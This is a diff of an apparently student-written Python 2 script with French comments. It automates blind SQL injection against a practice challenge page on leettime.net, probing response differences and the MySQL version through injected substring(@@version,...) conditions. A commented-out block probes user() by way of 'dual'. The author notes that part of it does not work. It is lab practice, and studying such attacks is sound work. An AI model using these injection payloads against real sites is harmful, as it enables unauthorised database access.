@@ -41,10 +41,32 @@ alphabet = "abcdefghijklmnopqrstuvwxyz"
 # ---- If url --------------
 url = "http://leettime.net/sqlninja.com/tasks/blind_ch1.php?id=1"
 
+# changer session, inutile
 with requests.session() as session:
     page = session.get(url)
     htmlpage = page.content
     print "Page 1\n", htmlpage, "\n"
+    htmlpage2 = ""
+    #    l_diff = []
+    for elem in l_injnum:
+        urli = url + " " + elem
+        page = requests.get(urli)
+        htmlpage2 = page.content
+        if ( htmlpage != htmlpage2 ):
+            break
+            #l_diff.append(elem)
+    print elem
+
+    for i in range(4,7):
+        urli = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
+        page = requests.get(urli)
+        htmlpage_version = page.content
+        if htmlpage2 == htmlpage_version:
+            break
+    if (i - 1 == 5 ):
+        print "Ok, version 5, on peut continuer"
+
+# cette partie ne fonctionne pas :(
     table = ""
     for i in range (1,6):
         for lettre in alphabet:
@@ -65,7 +87,10 @@ with requests.session() as session:
         print i
     print table
 
-"""    dual = ""
+
+"""
+Test utilisation de dual
+   dual = ""
     for i in range (1,6):
         dual = dual + '_'
         urli = url + "' and " + "(select 1 from dual where user() LIKE '" + dual + "')" + " or '"
@@ -76,25 +101,4 @@ with requests.session() as session:
         if htmlpage == htmlpage_dual:
             break
     print i
-
-
-htmlpage2 = ""
-#    l_diff = []
-    for elem in l_injnum:
-        urli = url + " " + elem
-        page = requests.get(urli)
-        htmlpage2 = page.content
-        if ( htmlpage != htmlpage2 ):
-            break
-            #l_diff.append(elem)
-    print elem
-
-    for i in range(4,7):
-        urli = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
-        page = requests.get(urli)
-        htmlpage_version = page.content
-        if htmlpage2 == htmlpage_version:
-            break
-    if (i - 1 == 5 ):
-        print "Ok, version 5, on peut continuer"
         """
